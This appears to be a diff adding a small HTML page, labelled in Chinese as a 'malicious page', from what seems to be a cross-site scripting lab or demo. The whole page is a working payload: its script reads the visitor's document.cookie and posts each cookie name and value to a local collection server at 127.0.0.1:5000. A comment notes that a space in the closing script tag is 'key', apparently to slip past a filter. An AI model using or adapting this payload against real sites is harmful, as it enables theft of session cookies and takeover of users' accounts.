@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8"/>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+        <title>恶意页面</title>
+        <script src="../static/js/jquery-3.5.1.min.js"></script>
+    </head>
+    <body>
+        <!--此页面不会被完全加载，只有target的div部分会被执行-->
+        <div id="target">
+            测试文本
+            <script>
+                var cookies = document.cookie.split(";");
+                console.log(cookies);
+                for (var i = 0; i < cookies.length; i++) {
+                    kv = cookies[i].trim().split("=");
+                    console.log(kv[0] + "-" + kv[1]);
+                    $.post("http://127.0.0.1:5000/fake/" + kv[0] + "-" + kv[1], function (data) {
+                        console.log(data);
+                    });
+                }
+            </script >
+            <!--关键的空格-->
+        </div>
+    </body>
+</html>
